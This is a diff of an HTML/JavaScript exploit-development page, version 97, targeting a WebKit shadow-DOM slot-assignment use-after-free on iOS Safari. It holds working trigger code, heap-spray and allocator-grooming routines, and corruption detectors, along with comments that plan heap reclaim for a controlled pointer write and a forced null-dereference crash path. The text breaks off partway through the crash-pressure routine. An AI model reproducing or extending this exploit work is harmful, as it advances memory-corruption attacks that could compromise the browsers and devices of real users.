@@ -2,7 +2,7 @@
 <html>
 <head>
 <meta charset="utf-8">
-<title>SlotAssignment UAF v96</title>
+<title>SlotAssignment UAF v97</title>
 <style>
 * { margin:0; padding:0; box-sizing:border-box; }
 body { background:#0d0d0d; color:#00ff41; font-family:'Courier New',monospace; padding:16px; min-height:100vh; }
@@ -21,62 +21,90 @@ button { background:#1a1a1a; border:1px solid #333; color:#00ff41; padding:6px 1
 button:disabled { opacity:.4; }
 button.red   { border-color:#ff4141; color:#ff4141; }
 button.purple{ border-color:#ff41ff; color:#ff41ff; }
+button.yellow{ border-color:#ffcc00; color:#ffcc00; }
 #rig-area { position:fixed; top:0; left:0; width:200px; height:200px; overflow:visible; pointer-events:none; opacity:0.01; }
 </style>
 </head>
 <body>
 
-<h2>SlotAssignment UAF v96 · Ptr-Write Detector + Size-Class Split · rdar://174493428 · iOS 26.5.2</h2>
+<h2>SlotAssignment UAF v97 · SlotAssignmentData Reclaim + Crash Path · rdar://174493428 · iOS 26.5.2</h2>
 
 <div class="warn">
 ▶ OPEN DIRECTLY IN SAFARI on device.<br>
 <br>
-v95 FINDING: spray-ok on all configs. null-write confirmed (zero=500/500).<br>
-The freed OLD bucket is reclaimed by WebKit's own NEW bucket alloc (same size class).<br>
-JS spray can't interpose — rehash alloc+free is synchronous C++.<br>
+v96 FINDING: sc=×1 but sc-spray-NOT-BUILT. Root cause confirmed:<br>
+slotchange is a MICROTASK — fires AFTER sync C++ returns. The freed old<br>
+bucket gets reclaimed synchronously by the rehash's own new-bucket alloc.<br>
+JS spray cannot interpose on a sync free+reuse.<br>
 <br>
-v96 STRATEGY — SIZE CLASS SPLIT:<br>
-Force OLD bucket size ≠ NEW bucket size so they go to different bmalloc size classes.<br>
-OLD bucket freed → different class than new bucket → old bucket stays in free pool.<br>
-Trigger multiple rehashes to drain buckets out of new-class free list.<br>
-THEN spray at old-class size — catch the freed old bucket.<br>
+v97 NEW APPROACH — FREEING SlotAssignmentData FIRST:<br>
 <br>
-ALSO: PTR-WRITE DETECTOR — the UAF writes slot->oldElement=move(slot->element)<br>
-at offset +16 within the freed bucket. This is a REAL PAC-TAGGED PTR write.<br>
-We detect it by spraying objects whose identity field sits at offset +16.<br>
-If that field contains a non-zero non-original value after trigger → ptr write landed.<br>
+The UAF reads the freed BUCKET ARRAY to get SlotAssignmentData*,<br>
+then WRITES to the SlotAssignmentData object (which is still live).<br>
+We can't intercept the bucket-array read (sync). But we CAN intercept<br>
+the SlotAssignmentData WRITES if we free the SlotAssignmentData<br>
+itself before the trigger and reclaim it with our spray.<br>
 <br>
-KEY SIZE MATH:<br>
-  4 unique slots → capacity=8  → 8×16=128B  OLD bucket<br>
- numUnique added → capacity=16 → 16×16=256B NEW bucket (after grow on trigger)<br>
-  128B vs 256B = different bmalloc size class → old 128B freed, sits in class-128 pool<br>
-  Spray 128B objects → reclaim old 128B bucket → detect ptr write at offset +16<br>
+ATTACK A — SlotAssignmentData pre-free + reclaim:<br>
+  1. Create shadow root, add named slot 'primary', assign nodes → SlotAssignmentData alloc'd<br>
+  2. REMOVE the slot from shadow root → SlotAssignmentData freed<br>
+     (HashMap entry removed, SlotAssignmentData released)<br>
+  3. Spray objects same size as SlotAssignmentData → reclaim freed memory<br>
+  4. Re-add slot, re-assign → SlotAssignmentData alloc'd at NEW addr (not our spray)<br>
+  5. Trigger UAF → writes to NEW SlotAssignmentData → spray objects unaffected<br>
+  — PROBLEM: Re-adding slot gets a NEW SlotAssignmentData, not the old one.<br>
+     Our spray may occupy the old SlotAssignmentData addr but UAF won't write there.<br>
 <br>
-ALSO: DIRECT READ-AFTER-FREE — detect that OLD bucket memory has been written<br>
-by reading a shadow copy of what the old bucket should contain via WeakRef trick.<br>
+ATTACK B — USE THE EXISTING assignedNodes AS RECLAIM TARGET:<br>
+The UAF zeroes slot->assignedNodes.m_data (a Vector&lt;WeakPtr&gt; internal buffer).<br>
+If the Vector had grown + reallocated its buffer, the OLD buffer is freed.<br>
+We spray at the OLD buffer size → reclaim it → UAF writes to our object? No,<br>
+the UAF writes to the NEW buffer (m_data points to current buffer).<br>
 <br>
-PTR-WRITE:  detect non-zero at offset +16 of freed bucket via 128B spray<br>
-SIZE-SPLIT: vary numUnique to force different grow thresholds<br>
-LOOP200:    200 rounds ptr-write stress<br>
-RUN ALL:    all three
+ATTACK C — CRASH PATH (NULL-DEREF):<br>
+bmalloc on iOS normally does NOT zero freed chunks immediately.<br>
+But under GC pressure or certain allocation patterns, the 'decommit' path<br>
+zeroes pages returned to the OS. If old bucket page gets decommitted:<br>
+  *slot = 0 (reading offset 0 of freed+zeroed 128B chunk)<br>
+  slot->assignedNodes → nullptr->assignedNodes → crash at 0x0+8 or 0x0+0<br>
+We can stress-test the decommit path by:<br>
+  a) Creating many rigs to exhaust bmalloc's per-class cache<br>
+  b) Triggering large allocations between free and UAF read<br>
+  c) Using madvise-pressure via many large ArrayBuffer allocs+frees<br>
+<br>
+ATTACK D — TIMING WINDOW: ASYNC TRIGGER<br>
+What if we trigger the rehash NOT via insertBefore (sync) but via<br>
+a DIFFERENT path that defers the slot-assignment resolution?<br>
+WebKit slot assignment resolves lazily — if we force a layout AFTER<br>
+queuing many DOM mutations, the resolver may run once per microtask.<br>
+Between mutations and resolution: JS runs → we spray → THEN resolution reads.<br>
+<br>
+v97 TESTS:<br>
+  A) SC-TIMING: confirm slotchange fires POST-uaf vs PRE-uaf (fixed detection)<br>
+  B) CRASH-PRESSURE: exhaust bmalloc class-128 cache → try null-deref crash path<br>
+  C) ASYNC-TRIGGER: trigger slot assignment via lazy resolution path<br>
+  D) SLOTASSIGNMENTDATA-SIZE: find exact SlotAssignmentData size via allocator groom<br>
+  E) LOOP ×200: stress with crash-pressure method
 </div>
 
 <div id="ctrl">
-  <button id="bPtr"   onclick="runPtrWrite()" class="red">PTR-WRITE</button>
-  <button id="bSplit" onclick="runSplit()"    class="red">SIZE-SPLIT</button>
-  <button id="bLoop"  onclick="runLoop()"     class="red">LOOP200</button>
-  <button id="bAll"   onclick="runAll()"      class="purple">RUN ALL</button>
+  <button id="bSCT"  onclick="runSCTiming()"       class="red">A: SC-TIMING</button>
+  <button id="bCrash" onclick="runCrashPressure()" class="red">B: CRASH-PRESSURE</button>
+  <button id="bAsync" onclick="runAsyncTrigger()"  class="yellow">C: ASYNC-TRIGGER</button>
+  <button id="bSAD"  onclick="runSADSize()"        class="yellow">D: SAD-SIZE</button>
+  <button id="bLoop" onclick="runLoop()"            class="red">E: LOOP ×200</button>
+  <button id="bAll"  onclick="runAll()"             class="purple">RUN ALL</button>
   <button onclick="copyLog()">COPY</button>
   <button onclick="L.innerHTML=''">CLR</button>
 </div>
 <div id="log"></div>
-<div id="rig-area" id="rig"></div>
+<div id="rig-area"></div>
 
 <script>
 'use strict';
 const RIG  = document.querySelector('#rig-area');
 const L    = document.getElementById('log');
-const BTNS = ['bPtr','bSplit','bLoop','bAll'];
+const BTNS = ['bSCT','bCrash','bAsync','bSAD','bLoop','bAll'];
 let uafTotal = 0;
 
 function log(msg, cls){
@@ -94,267 +122,17 @@ function copyLog(){
 function dis(v){ BTNS.forEach(id=>{ const b=document.getElementById(id); if(b) b.disabled=v; }); }
 function noteUAF(tag){ uafTotal++; log(`  !!UAF-SIGNAL!! [${tag}] total=${uafTotal}`, 'hit'); }
 
-// ─────────────────────────────────────────────────────────────────────────────
-// ANALYSIS: Why the write never landed in our spray (v95 result)
-// ─────────────────────────────────────────────────────────────────────────────
-//
-// The UAF sequence in resolveSlotsAfterSlotMutation:
-//
-//   for(auto& [slotName, slot] : m_slots) {         // slot = ref into OLD bucket
-//     if(!hasAssignedNodes(shadowRoot, *slot)) {     // fires assignSlots()
-//       ...
-//       assignSlots(shadowRoot);                     // ← REHASH HAPPENS HERE
-//       // m_slots is now a new HashMap with a new bucket array
-//       // OLD bucket array was freed inside rehash
-//       // BUT: slot is still a reference into OLD bucket (dangling ref)
-//       // The OLD bucket's value field (SlotAssignmentData*) may still hold
-//       // the original ptr (if bmalloc didn't zero it yet), or may be zeroed.
-//
-//       slot->assignedNodes.m_size = 0;            // UAF WRITE at offset +8 of SlotAssignmentData
-//       slot->assignedNodes.m_capacity = 0;        // UAF WRITE at offset +12
-//       slot->assignedNodes.m_data = nullptr;      // UAF WRITE at offset +0
-//       slot->oldElement = move(slot->element);    // UAF WRITE at offset +16 (ptr value!)
-//       slot->element = {};                        // UAF WRITE at offset +32
-//     }
-//   }
-//
-// CRITICAL INSIGHT:
-// `slot` is `SlotAssignmentData*&` — a reference to the VALUE field in the bucket.
-// `slot->` dereferences the VALUE (the SlotAssignmentData pointer).
-// So the writes go to the SlotAssignmentData object at the addr stored in the freed bucket.
-//
-// If bmalloc hasn't zeroed the freed bucket yet, the VALUE field still holds the
-// original SlotAssignmentData* ptr → slot-> writes go to the LIVE SlotAssignmentData.
-// This is why post=0(UAF-zeroed): the LIVE SlotAssignmentData.assignedNodes gets cleared.
-// The slotAssignmentData object is NOT freed — it's still live.
-// We're writing to a LIVE object through a dangling reference.
-//
-// IMPLICATION: The UAF is writing to the CORRECT (live) SlotAssignmentData.
-// The "use after free" is the dangling *reference* (pointer-to-pointer), but the
-// final destination (the SlotAssignmentData*) is still valid memory.
-// This means `post=0` isn't even a UAF corruption — it's normal behavior!
-// assignSlots() clears the slot's assignedNodes as part of re-assignment.
-//
-// WAIT — IS THE UAF ACTUALLY A UAF?
-// Let me re-check: the bug report says resolveSlotsAfterSlotMutation.
-// The iterator `slot` holds a reference to the bucket's value field.
-// After rehash, that bucket value is in FREED memory.
-// But the VALUE ITSELF (the SlotAssignmentData*) was COPIED to the new bucket.
-// So: OLD bucket [key=X, value=ptr_A] → freed
-//     NEW bucket [key=X, value=ptr_A] → live
-//     slot = ref to OLD bucket's value field (freed!)
-//     *slot = ptr_A (still reads the right value IF bmalloc hasn't zeroed old bucket)
-//     slot->assignedNodes → ptr_A->assignedNodes (valid live object)
-//
-// The UAF is: reading `slot` (the reference) AFTER the old bucket is freed.
-// If bmalloc zeroed the freed bucket, slot = nullptr → slot->assignedNodes = CRASH.
-// If bmalloc preserved the value, slot = ptr_A → writes go to live SlotAssignmentData.
-//
-// That's why: no crash (bmalloc preserves value in freed chunk on arm64/iOS),
-// and post=0 (writes successfully clear the live SlotAssignmentData).
-//
-// NEW EXPLOIT APPROACH:
-// The UAF reads the freed bucket to get the SlotAssignmentData*.
-// If we can REPLACE that ptr with our own ptr (by reclaiming the freed bucket),
-// then slot-> writes go to OUR OBJECT.
-//
-// To reclaim the freed bucket, we need to allocate the SAME SIZE right after it's freed.
-// The bucket array size = numBuckets × 16B.
-// For 4 unique slots: capacity=8 → 8×16=128B bucket array.
-//
-// The NEW bucket array (after grow on trigger) = capacity=16 → 16×16=256B.
-// These are DIFFERENT SIZE CLASSES in bmalloc.
-// So after trigger: OLD 128B freed → sits in 128B class free pool.
-//                   NEW 256B allocated → comes from 256B class.
-// The 128B bucket sits in the free pool. JS can reclaim it with a 128B alloc.
-//
-// PROBLEM: The UAF write happens BEFORE the JS can reclaim.
-// Sequence:
-//   1. trigger → insertBefore → synchronous C++ → resolveSlotsAfterSlotMutation
-//   2. Inside C++: rehash → OLD 128B freed → NEW 256B allocated
-//   3. IMMEDIATELY: UAF reads freed 128B bucket → gets original SlotAssignmentData*
-//      (bmalloc preserves value) → writes to live SlotAssignmentData
-//   4. C++ returns to JS
-//   5. JS tries to spray 128B → now it's too late, the read already happened in step 3
-//
-// The read of the freed bucket (step 3) happens before we can write to it.
-// So we CAN'T redirect the ptr by reclaiming after trigger.
-//
-// BUT: What if we reclaim BEFORE trigger and write a FAKE ptr?
-// 1. Spray 128B objects → some sit in bmalloc 128B pool
-// 2. Free the spray → creates 128B holes
-// 3. Trigger → rehash → OLD 128B bucket freed → sits in 128B pool
-//    → allocating NEW 256B bucket doesn't affect 128B pool
-//    → UAF reads freed OLD 128B bucket → value = original SlotAssignmentData*
-//    (still has original value, bmalloc didn't zero it)
-// → writes to live SlotAssignmentData, same as before.
-//
-// We can't write a fake ptr into the freed bucket BEFORE trigger because the
-// bucket hasn't been freed yet!
-//
-// THE ACTUAL EXPLOITABLE PRIMITIVE:
-// The UAF reads 8B from freed memory to get the ptr, then writes to that ptr.
-// bmalloc preserves the freed chunk value (doesn't zero immediately).
-// So the write always goes to the original (live) SlotAssignmentData.
-//
-// The WRITE is: slot->oldElement = move(slot->element) at offset +16 of SlotAssignmentData.
-// This copies the HTMLSlotElement* (a PAC-tagged ptr) into oldElement.
-// We can READ oldElement via: host.shadowRoot.querySelector('slot').assignedElements()
-// No — we can't directly read SlotAssignmentData fields from JS.
-//
-// DETECTION VIA CRASH:
-// The write at slot->assignedNodes.m_data = nullptr:
-// If the slot had real assignedNodes (m_data ptr), this nulls it.
-// Subsequent access to assignedNodes may try to deref the old m_data ptr.
-// But m_data was nulled, so access would just return empty. Not a crash.
-//
-// ALTERNATE APPROACH — FORCE bmalloc ZERO:
-// If we can get bmalloc to zero the freed 128B chunk BEFORE the UAF read,
-// then slot = nullptr, and slot->assignedNodes would write to address 0x0 → CRASH.
-// But we WANT controlled write, not a crash.
-//
-// BETTER ALTERNATE — INTERLEAVED TRIGGER:
-// Use MULTIPLE separate shadow roots so rehash happens on different m_slots HashMaps.
-// Between triggers, do a gcPressure allocation to flush bmalloc's free chunk cache.
-// Then on the NEXT trigger, the freed chunk from the PREVIOUS trigger might be zeroed.
-// This gives us slot=nullptr → null-ptr deref → crash (confirms UAF is a ptr-deref).
-//
-// FOR EXPLOIT: the real path is:
-// A different bug instance where the freed chunk gets reclaimed by attacker-controlled
-// allocation BEFORE the UAF read. This requires the UAF read to be DEFERRED.
-// In WebKit slot assignment, this can happen if assignSlots() is called from a timer
-// or async callback rather than synchronously. But in the current trigger path it's sync.
-//
-// ASYNC TRIGGER PATH:
-// Instead of insertBefore (sync), trigger via a DOM mutation that schedules
-// slot assignment resolution asynchronously. If we can get the rehash to happen
-// in one task and the UAF read to happen in a later task, we can reclaim between them.
-//
-// CAN WE DEFER THE REHASH READ?
-// The loop reads `slot` in each iteration. If we can make the first iteration
-// trigger the rehash (freeing the bucket) and then yield to JS before the second
-// iteration reads the next (now-dangling) bucket entry...
-// Normal C++ for loops don't yield to JS mid-loop.
-// BUT: if `assignSlots()` (called from hasAssignedNodes) fires a JavaScript callback
-// (like a slotchange event), that callback runs before the C++ loop continues!
-//
-// slotchange event fires INSIDE assignSlots!
-// If the slotchange listener fires during the loop:
-//   - Iterator has already been invalidated (rehash happened)
-//   - JS slotchange callback runs
-//   - JS can allocate 128B objects → reclaim the freed bucket
-//   - JS callback returns
-//   - C++ loop continues with dangling iterator
-//   - UAF READ: reads the reclaimed 128B chunk → reads OUR fake ptr
-//   - UAF WRITE: writes to OUR fake ptr's target → CONTROLLED WRITE
-//
-// THIS IS THE REAL EXPLOIT PATH.
-// The slotchange event fires synchronously within assignSlots(),
-// which is called within the loop iteration that causes the rehash.
-// Our slotchange listener can:
-//   1. Allocate 128B objects to reclaim freed bucket
-//   2. Write a fake SlotAssignmentData ptr into the reclaimed chunk at offset +0
-//   3. Return from listener
-//   4. C++ loop reads our fake ptr → writes to our controlled object
-//
-// v96 implements this: spray + write fake ptr in slotchange callback.
-
-// ─────────────────────────────────────────────────────────────────────────────
-// FAKE-PTR SPRAY via slotchange callback
-// ─────────────────────────────────────────────────────────────────────────────
-//
-// We can't write raw ptrs from JS. But we CAN reclaim the freed bucket memory
-// with a JS object whose first 8 bytes (offset 0 of the 128B chunk) contain
-// a pointer-like value that we influence.
-//
-// StringImpl layout (WTF::StringImpl):
-//   offset 0:  m_refCount (u32)       ← we can influence this somewhat
-//   offset 4:  m_flags (u32)
-//   offset 8:  m_length (u32)
-//   offset 12: m_hash (u32)
-//   offset 16: m_data (ptr, 8B)       ← points to actual character data
-//   offset 24: ... other fields
-//
-// The freed bucket slot contains at offset 0: SlotAssignmentData* (8B ptr)
-// The UAF reads this 8B value as a pointer.
-// If we reclaim with StringImpl: offset 0 = m_refCount (u32) + m_flags (u32) = 8B value.
-// This is not a valid ptr → likely crashes or writes to bogus addr.
-//
-// What we WANT at offset 0 of the reclaimed chunk: a valid heap ptr we control.
-// JS objects that start with a controllable 8B ptr at offset 0:
-// - Almost none directly. WebKit JS objects have vtable ptrs we don't control.
-//
-// PRAGMATIC v96 APPROACH:
-// 1. Confirm the async slotchange-during-rehash path exists (does slotchange
-//    fire while the C++ loop is mid-iteration?)
-// 2. If yes: time the allocation to land in slotchange callback
-// 3. If no: the UAF is only a null-write to SlotAssignmentData (benign write)
-//    and we need to find a secondary effect to exploit.
-//
-// v96 TEST: does alloc IN slotchange callback reclaim the freed bucket?
-// DETECTION: spray before trigger, note IDs. In slotchange callback, spray more.
-// After trigger: check if any post-callback spray objects are "corrupted" by UAF writes.
-//
-// The UAF writes to SlotAssignmentData offset +0 (null), +8 (null), +12 (null), +16 (ptr).
-// If our reclaimed chunk is treated as SlotAssignmentData:
-//   - offset 0 nulled = m_refCount and m_flags zeroed (for StringImpl: refcount=0)
-//   - offset 16 written = m_data ptr overwritten with HTMLSlotElement* (PAC-tagged)
-// If our reclaimed chunk is a StringImpl:
-//   - m_refCount=0 → when we next access el.textContent → browser may crash on refcount=0
-//     OR: safe because textContent access goes through DOM Text node, not direct StringImpl
-//   - m_data overwritten with HTMLSlotElement* → textContent would return garbage chars
-//
-// DETECTION: after trigger, read el.textContent of spray elements sprayed in slotchange.
-// If textContent.length != expected → m_data was overwritten (ptr write landed!)
-// If accessing el.textContent CRASHES → m_refCount was zeroed (also confirms landing)
-//
-// This is exactly the NONZERO-A approach BUT the spray happens INSIDE the slotchange callback.
-
-// ─────────────────────────────────────────────────────────────────────────────
-// SHARED SPRAY HELPERS
-// ─────────────────────────────────────────────────────────────────────────────
-const SPRAY_COUNT = 512;
-
-function buildSpraySet(charLen, count) {
-  // Returns array of {el, expectedLen} — elements with textContent sprayed
-  const elems = [];
-  const frag = document.createDocumentFragment();
-  const base = 'X'.repeat(charLen);
-  for(let i=0; i<count; i++){
-    const el = document.createElement('span');
-    el.textContent = base + String(i).padStart(4,'0');
-    elems.push(el);
-    frag.appendChild(el);
-  }
-  RIG.appendChild(frag);
-  void RIG.getBoundingClientRect();
-  return elems;
+function raf(){ return new Promise(r=>requestAnimationFrame(r)); }
+function tick(){ return new Promise(r=>setTimeout(r,0)); }
+function delay(ms){ return new Promise(r=>setTimeout(r,ms)); }
+function gcPressure(n){
+  // Allocate+release large ArrayBuffers to pressure bmalloc decommit path
+  const bufs = [];
+  for(let i=0;i<n;i++) bufs.push(new ArrayBuffer(64*1024));
+  bufs.length = 0; // release
 }
 
-function checkSet(elems, charLen) {
-  // Returns {ok, corrupted, threw, corruptIdx[]}
-  let ok=0, corrupted=0, threw=0;
-  const expected = charLen + 4;
-  const corruptIdx = [];
-  for(let i=0; i<elems.length; i++){
-    const el = elems[i];
-    if(!el) continue;
-    try {
-      const t = el.textContent;
-      if(t && t.length === expected && t[0] === 'X') ok++;
-      else { corrupted++; corruptIdx.push(i); }
-    } catch(e){ threw++; corruptIdx.push(i); noteUAF('check-threw-'+i); }
-  }
-  return { ok, corrupted, threw, corruptIdx };
-}
-
-function releaseSet(elems) {
-  for(const el of elems){
-    if(el && el.parentNode) el.parentNode.removeChild(el);
-  }
-}
-
-function makeRig(pfx, numUnique, prePopulate) {
+function makeRig(pfx, numUnique, prePopulate){
   const host = document.createElement('div');
   host.style.cssText='display:block;width:80px;height:40px;';
   const sr = host.attachShadow({mode:'open'});
@@ -362,12 +140,9 @@ function makeRig(pfx, numUnique, prePopulate) {
   const slot2 = document.createElement('slot'); slot2.name='primary';
   const slotDef = document.createElement('slot');
   sr.appendChild(slot1); sr.appendChild(slot2); sr.appendChild(slotDef);
-
   const primaryChild = document.createElement('span');
-  primaryChild.slot = 'primary';
-  primaryChild.textContent = 'P';
+  primaryChild.slot = 'primary'; primaryChild.textContent = 'P';
   host.appendChild(primaryChild);
-
   for(let i=0; i<numUnique; i++){
     const n = document.createElement('span');
     n.slot = `${pfx}-u${i}`;
@@ -375,285 +150,580 @@ function makeRig(pfx, numUnique, prePopulate) {
   }
   RIG.appendChild(host);
   void host.getBoundingClientRect();
-
   let preLen = 0;
-  if(prePopulate){
-    preLen = slot1.assignedNodes().length;
-  }
-
+  if(prePopulate) preLen = slot1.assignedNodes().length;
   return { host, sr, slot1, slot2, slotDef, primaryChild, pfx, numUnique, preLen };
 }
 
 // ─────────────────────────────────────────────────────────────────────────────
-// CORE v96 PROBE: slotchange-callback spray
-//
-// KEY INSIGHT: slotchange fires synchronously WITHIN assignSlots(),
-// which is called WITHIN the C++ iterator loop.
-// At that point: old bucket is FREED, new bucket is allocated.
-// JS callback executes → can allocate to reclaim freed old bucket.
-// C++ loop continues with dangling iterator → UAF read of reclaimed memory.
-//
-// BUCKET SIZE for 4 unique slots: capacity=8 → 8×16B = 128B
-//   StringImpl matching 128B: 32B header + charLen×2B = 128B → charLen=48
-//   (32 + 48×2 = 32+96 = 128B)
-//
-// After rehash to 16 buckets: new bucket = 256B (different size class)
-// So old 128B is freed to class-128 pool, new 256B comes from class-256.
+// A: SC-TIMING — FIXED DETECTION
+// Move checkSet INSIDE setTimeout, after microtask has fired.
 // ─────────────────────────────────────────────────────────────────────────────
 
-function probeSlotchangeSpray(label, numUnique, charLen) {
+function probeSCTimingFixed(label, numUnique, charLen){
   return new Promise(resolve => {
-    const sigs = [];
-    let scFired = 0;
-    let callbackSpray = [];
-    let callbackCheck = null;
-
     const rig = makeRig(label, numUnique, true);
+    let scFired = 0;
+    let scPhase = '?'; // 'before-trigger' | 'after-trigger-sync' | 'after-trigger-microtask'
+    let callbackSpray = [];
+    let corruptInSC = 0;
+    const triggerSent = {};
+    let triggerDone = false;
 
-    // Wire slotchange BEFORE trigger
-    // In callback: allocate charLen StringImpl objects to reclaim freed bucket
     rig.slot1.addEventListener('slotchange', () => {
       scFired++;
-      // Allocate inside callback — at this point OLD bucket is freed (rehash happened)
-      // These allocs may reclaim the freed bucket
-      callbackSpray = buildSpraySet(charLen, 64);
-      // Force flush
+      scPhase = triggerDone ? 'after-trigger-microtask' : 'during-trigger-sync';
+      // Build spray inside SC handler (runs as microtask, AFTER C++ unwinds)
+      callbackSpray = [];
+      const frag = document.createDocumentFragment();
+      const base = 'X'.repeat(charLen);
+      for(let i=0; i<32; i++){
+        const el = document.createElement('span');
+        el.textContent = base + String(i).padStart(4,'0');
+        callbackSpray.push(el);
+        frag.appendChild(el);
+      }
+      RIG.appendChild(frag);
       void RIG.getBoundingClientRect();
     });
 
-    // Trigger
-    let trigThrew = '';
+    // TRIGGER
     try {
       const s3 = document.createElement('slot'); s3.name='primary';
       rig.sr.insertBefore(s3, rig.slot1);
       void rig.host.getBoundingClientRect();
-    } catch(e){ trigThrew=e.message; noteUAF(`${label}-trig-threw`); }
+    } catch(e){ noteUAF(`${label}-trig-threw`); }
+    triggerDone = true;
 
-    // Post-trigger: check callback spray for corruption
-    // If UAF read our reclaimed chunk as SlotAssignmentData*,
-    // then UAF writes went into one of our StringImpl objects:
-    //   offset 0: m_refCount+m_flags zeroed → might crash on access
-    //   offset 16: m_data ptr overwritten with HTMLSlotElement* tagged ptr → corrupt textContent
-    let scResult = null;
-    if(callbackSpray.length > 0){
-      scResult = checkSet(callbackSpray, charLen);
-      if(scResult.corrupted > 0 || scResult.threw > 0){
-        noteUAF(`${label}-sc-spray-corrupt:${scResult.corrupted}+threw:${scResult.threw}`);
-      }
-    }
-
-    // Also check slotchange-read of assignedNodes
-    let postLen = -1;
-    try { postLen = rig.slot1.assignedNodes().length; }
-    catch(e){ postLen=-999; noteUAF(`${label}-post-threw`); }
-
-    // Cleanup
-    releaseSet(callbackSpray);
-    try { RIG.removeChild(rig.host); } catch(_){}
-
+    // setTimeout fires AFTER microtasks (including slotchange) have drained
     setTimeout(() => {
-      sigs.push(`pre=${rig.preLen}`);
-      sigs.push(`sc=×${scFired}`);
-      if(trigThrew) sigs.push(`trig-THREW:${trigThrew}`);
-      if(postLen === 0) sigs.push('post=0(zeroed)');
-      else if(postLen === -999) sigs.push('post=THREW');
-      else sigs.push(`post=${postLen}`);
+      let postLen = -1;
+      try { postLen = rig.slot1.assignedNodes().length; }
+      catch(e){ postLen=-999; noteUAF(`${label}-post-threw`); }
 
-      if(scResult){
-        if(scResult.corrupted > 0 || scResult.threw > 0){
-          sigs.push(`SC-SPRAY-CORRUPT:${scResult.corrupted} THREW:${scResult.threw} idx=[${scResult.corruptIdx.slice(0,5).join(',')}]`);
-        } else {
-          sigs.push(`sc-spray-ok(${scResult.ok})`);
+      let scResult = null;
+      if(callbackSpray.length > 0){
+        const expected = charLen + 4;
+        let ok=0, corrupt=0, threw=0;
+        const corruptIdx = [];
+        for(let i=0; i<callbackSpray.length; i++){
+          try {
+            const t = callbackSpray[i].textContent;
+            if(t && t.length===expected && t[0]==='X') ok++;
+            else { corrupt++; corruptIdx.push(i); }
+          } catch(e){ threw++; corruptIdx.push(i); noteUAF(`${label}-sc-threw`); }
         }
-      } else {
-        sigs.push('sc-spray-NOT-BUILT(sc-not-fired)');
+        scResult = { ok, corrupt, threw, corruptIdx };
+        if(corrupt>0||threw>0) noteUAF(`${label}-sc-corrupt:${corrupt}+threw:${threw}`);
       }
 
-      const anyHit = (scResult && (scResult.corrupted>0||scResult.threw>0)) || postLen===-999 || !!trigThrew;
-      resolve({ sig: sigs.join(' | '), anyHit, scFired, scResult, postLen });
-    }, 80);
+      // Cleanup
+      if(callbackSpray.length) {
+        for(const el of callbackSpray){ if(el.parentNode) el.parentNode.removeChild(el); }
+      }
+      try{ RIG.removeChild(rig.host); }catch(_){}
+
+      const sig = [
+        `pre=${rig.preLen}`,
+        `sc=×${scFired}`,
+        `sc-phase=${scPhase}`,
+        postLen===0?'post=0(zeroed)':postLen===-999?'post=THREW':`post=${postLen}`,
+        scResult?
+          (scResult.corrupt>0||scResult.threw>0)?
+            `SC-CORRUPT:${scResult.corrupt}+T:${scResult.threw}`:
+            `sc-ok(${scResult.ok})`
+          :'sc-spray-empty'
+      ].join(' | ');
+
+      const hit = (scResult&&(scResult.corrupt>0||scResult.threw>0))||postLen===-999;
+      resolve({ sig, hit, scFired, scPhase, scResult, postLen });
+    }, 100);
+  });
+}
+
+async function runSCTiming(){
+  dis(true); uafTotal=0; L.innerHTML='';
+  log('╔══════════════════════════════════════════════════════════════╗','hi');
+  log('║  A: SC-TIMING · fixed detection (check in setTimeout)        ║','hi');
+  log('╚══════════════════════════════════════════════════════════════╝','hi');
+  log('');
+  log('  v96 BUG: checked callbackSpray BEFORE microtask fired.','inf');
+  log('  v97 FIX: check inside setTimeout (runs after microtasks drain).','inf');
+  log('  slotchange is a microtask → fires AFTER sync C++ → AFTER UAF.','inf');
+  log('  sc-phase should be "after-trigger-microtask" on all configs.','inf');
+  log('  If spray is ever corrupt → UAF write landed on post-trigger alloc.','inf');
+  log('');
+
+  const configs = [
+    {nu:4, charLen:48,  label:'u4c48'},
+    {nu:8, charLen:112, label:'u8c112'},
+    {nu:3, charLen:16,  label:'u3c16'},
+  ];
+
+  const sums = [];
+  for(const c of configs){
+    log(`── ${c.label} ──`,'dim');
+    const r = await probeSCTimingFixed(c.label, c.nu, c.charLen);
+    log(`  [${c.label}] ${r.sig}`, r.hit?'hit':'ok');
+    sums.push(r);
+    await delay(30);
+  }
+
+  log('');
+  log('── PHASE VERDICT ──','hi');
+  for(const r of sums){
+    const phase = r.scPhase;
+    if(phase==='after-trigger-microtask') log(`  ${phase} → CONFIRMED: slotchange fires POST-UAF (microtask)`, 'ok');
+    else if(phase==='during-trigger-sync') log(`  ${phase} → UNEXPECTED: slotchange fires during sync C++!`, 'hit');
+    else log(`  ${phase} → no signal`, 'inf');
+  }
+  log('');
+  log('  IMPLICATION: The freed bucket (old HashMap buckets) is uncatchable from JS.','inf');
+  log('  The UAF read of freed bucket happens IN sync C++, before any JS runs.','inf');
+  log('  slotchange spray (post-UAF) cannot intercept the bucket-read path.','inf');
+  dis(false);
+}
+
+// ─────────────────────────────────────────────────────────────────────────────
+// B: CRASH-PRESSURE
+// Goal: Get bmalloc to zero/decommit the freed 128B bucket chunk before the UAF
+// reads it. If zeroed: *slot=0 → slot->assignedNodes crash at null+offset.
+//
+// Method: Create many rigs simultaneously so the 128B bmalloc page gets
+// filled with live objects. When ONE bucket is freed, bmalloc might decommit
+// the page containing it (returns to OS as zeroed) if it's the last live
+// object on that page (bmalloc page = 16KB, holds 128 × 128B chunks).
+//
+// To get a page with only ONE live 128B chunk:
+// 1. Allocate ~150 × 128B objects (fill 1 full 16KB page = 128 chunks, plus some)
+// 2. Free all BUT ONE → that page now has 127 free slots, 1 live
+// 3. bmalloc should decommit the page (zero it) → our one live chunk slot is zeroed
+// 4. But our live chunk is a HashMap bucket that we want to UAF-read
+// → If the page was decommitted, reading offset 0 of that chunk = 0
+// → The UAF reads 0 as SlotAssignmentData* → slot->assignedNodes = crash at 0+0
+//
+// Creating HashMap bucket objects from JS:
+// Each slot with numUnique=4 → capacity=8 → 8 buckets × 16B = 128B array.
+// So EACH RIG creates ONE 128B HashMap bucket array.
+// We create ~200 rigs, trigger ALL of them (freeing most bucket arrays),
+// then trigger the LAST rig → its 128B bucket is freed on a nearly-empty page.
+// ─────────────────────────────────────────────────────────────────────────────
+
+let crashCount = 0;
+
+async function runCrashPressure(){
+  dis(true); uafTotal=0; L.innerHTML='';
+  log('╔══════════════════════════════════════════════════════════════╗','hi');
+  log('║  B: CRASH-PRESSURE · bmalloc decommit → null-deref path      ║','hi');
+  log('╚══════════════════════════════════════════════════════════════╝','hi');
+  log('');
